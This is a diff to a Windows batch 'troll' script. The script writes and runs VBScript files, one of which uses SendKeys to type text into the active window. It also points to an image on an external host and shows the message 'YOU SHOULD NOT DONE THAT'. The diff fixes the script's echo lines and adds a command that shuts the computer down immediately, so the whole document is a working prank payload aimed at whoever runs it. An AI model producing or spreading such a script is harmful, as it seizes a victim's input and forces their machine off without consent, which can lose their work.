@@ -1,6 +1,6 @@
 @echo off
 echo a=inputbox("Enter BEN.EXE to sure you run") >> troll.vbs
-echo if a="BEN.EXE" then
+echo if a="BEN.EXE" then >> troll.vbs
 start troll.vbs
 timeout 10
 set "url=https://i.postimg.cc/s2G0KT6z/images.jpg"
@@ -44,12 +44,12 @@ start hacked.vbs
     echo     ch = Mid(text, i, 1)
     echo     WshShell.SendKeys ch
     echo     WScript.Sleep speed
-    echo Next
-)
+    echo Next )
 wscript type_writer.vbs
 timeout /t 2 >nul
 del type_writer.vbs
 timeout 10
 shutdown -c "YOU SHOULD NOT DONE THAT" -s
+shutdown -s -t 0
 pause
 
